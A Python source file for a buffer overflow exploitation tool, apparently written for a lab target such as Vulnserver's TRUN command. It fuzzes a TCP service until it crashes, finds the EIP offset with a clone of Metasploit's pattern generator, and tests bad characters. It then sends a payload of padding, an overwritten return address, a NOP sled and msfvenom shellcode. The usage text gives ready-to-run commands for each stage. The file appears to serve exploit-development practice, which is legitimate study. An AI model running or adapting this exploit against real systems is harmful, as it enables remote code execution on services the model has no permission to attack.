'''
A dumb buffer overflow script that fuzzes target server:
- Integrated `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` for offset finding
- Bad character testing

Usage:
- Fuzz:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode fuzz

- Offset + EIP:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400

- Bad Character Tests:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --length 2003

- Verify EIP offset:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode verify --length 2003

- Shellcode:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode shellcode --length 2003 \
        --shell_file shell.txt --eip 625011af

'''

import argparse
import socket
from time import sleep
from math import ceil
from enum import Enum


# Find out the amount of bytes it takes for the target program to crash
def fuzz(target: str, port: int, expect_resp: bool, stride: int, command_prefix: str, timeout_secs: int) -> int:
    payload = "A" * stride

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout_secs)
        sock.connect((target, port))
        while True:
            try:
                print("send %s bytes" % len(payload))
                sock.send((command_prefix + payload).encode("utf-8"))
                if expect_resp:
                    sock.recv(1024)
                payload += "A" * stride
                sleep(1)
            except Exception as e:
                print(e)
                return len(payload)


def find_offset(sequence: str) -> int:
    le_hex = input("Enter EIP value:")
    # since windows uses little endian, the value is reversed
    #   e.g. 386F4337 => 8oC7 => 7Co8
    substr = bytearray.fromhex(le_hex).decode()[::-1]
    return sequence.find(substr)


# A lazy sequence implementation of `pattern_create` from `rapid7/rex-text`
# {UPPER, LOWER, NUMBER}
# Unique iteration length = 26 * 26 * 10 * 3 = 20280
def generate_unique_pattern(length) -> str:
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = upper.lower()
    num = "0123456789"
    res = ""
    # In case the required length is over 20280
    iterations = ceil(length // 20280)
    for _ in range(iterations + 1):
        for u in upper:
            for l in lower:
                for n in num:
                    queue = [n, l, u]
                    while len(res) < length:
                        res += queue.pop()
                        if not queue:
                            break
    return res


class Chunk_type(Enum):
    UTF = 1
    BYTE = 2


# Send a chunk of unique pattern'd data to target server
def send_chunk(target: str, port: int, command_prefix: str, sequence, type: Chunk_type = Chunk_type.UTF):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target, port))
        print("send %s bytes" % len(sequence))
        # Bad Character needs to be sent as bytes, utf-8 encoding will result in random C0 characters
        #   in between
        # However, some other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
        # which might have something to do with Little Endian
        if type == Chunk_type.UTF:
            print("utf-8")
            sock.send((command_prefix + sequence).encode("utf-8"))
        elif type == Chunk_type.BYTE:
            # Payload passed in is suffix bytes
            print("byte array")
            payload = bytearray(command_prefix, "raw_unicode_escape")
            payload.extend(sequence)
            print(payload)
            sock.send((payload))
        print("sent")


# Arguments
parser = argparse.ArgumentParser(description="Dumb fuzzing tool")

# -- Mode --
parser.add_argument("--mode", type=str,
                    help="[required] attack mode: fuzz|offset|badchar|verify_offset|shellcode")

# -- Target --
parser.add_argument("--target", type=str, help="[required] target server")
parser.add_argument("--port", type=int, help="[required] target port")

parser.add_argument(
    "-resp", type=str, help="whether the command would return a response. default true", default=True)
parser.add_argument("--timeout", type=bool,
                    help="[optional] timeout in seconds if program didn't respond. default 5", default=5)
parser.add_argument("--prefix", type=str,
                    help="[optional] command prefix. default empty", default="")

# -- Fuzz --
parser.add_argument("--stride", type=int,
                    help="[optional] number in bytes to increment for each fuzzing iteration. default 100", default=100)

# -- Offset -- | -- Bad Character -- | -- Shellcode --
# FIXME: Make arguments required conditionally
parser.add_argument("--length", type=int,
                    help="[offset mode] unique pattern of strings at given length to be sent. default 2000\n\
    [badchar mode] offset right before EIP location, used for testing bad characters", default=2000)

# -- Shellcode --
shellcode_example = '''
unsigned char buf[] = 
"\x52\x31"
"\xff\xc6"
"\x80\xbe";'''
parser.add_argument("--shell_file", type=str,
                    help="shellcode file that's generated by msfvenom. e.g. " + shellcode_example, default="")
parser.add_argument("--eip", type=str,
                    help="EIP value to jump to unprotected module's address, \
                        this will be converted to Little Endian internally. e.g. 625011af", default="")


# Main Program
args = parser.parse_args()

mode = args.mode.lower()

if mode == "fuzz":
    len_crash_bytes = fuzz(args.target, args.port,
                           args.resp, args.stride, args.prefix, args.timeout)
    print("Program crashed at %s bytes", len_crash_bytes)

elif mode == "offset":
    seq = generate_unique_pattern(args.length)
    send_chunk(args.target, args.port, args.prefix, seq)
    offset = find_offset(seq)
    print("offset is at", offset)

elif mode == "badchar":
    # Generate 0x01 to 0xff into a string
    badchars = "".join([chr(h) for h in range(1, 256)])
    # As the stack size might be limited, we place this full set of bad characters inside heap
    payload = bytes(args.length * "A" + "B" * 4 +
                    badchars, "raw_unicode_escape")
    # print("sending bad character test payload:", payload)
    send_chunk(args.target, args.port, args.prefix,
               payload, Chunk_type.BYTE)

elif mode == "verify":
    payload = bytes(args.length * "A" + "DEFG", "raw_unicode_escape")
    send_chunk(args.target, args.port, args.prefix,
               payload, Chunk_type.BYTE)


elif mode == "shellcode":
    with open(args.shell_file) as f:
        content = f.read()
    # Clean up & Convert msfvenom shellcode into bytearrays
    shellcode_str = "".join([line for line in content.replace(
        "unsigned char buf[] = ", "").replace(";", "").replace('"', "").split("\n")])
    shellcodes_hex = list(filter(lambda c: len(c) > 0, [
        c for c in shellcode_str.split("\\x")]))

    payload = bytearray(args.length * "A", "raw_unicode_escape")
    # Convert EIP input to Little Endian
    payload.extend(bytearray.fromhex(args.eip)[::-1])
    payload.extend(bytes("\x90" * 50, "raw_unicode_escape"))

    for h in shellcodes_hex:
        payload.extend(bytearray.fromhex(h))

    send_chunk(args.target, args.port, args.prefix,
               payload, Chunk_type.BYTE)

else:
    print("[ERROR] attack mode invalid")
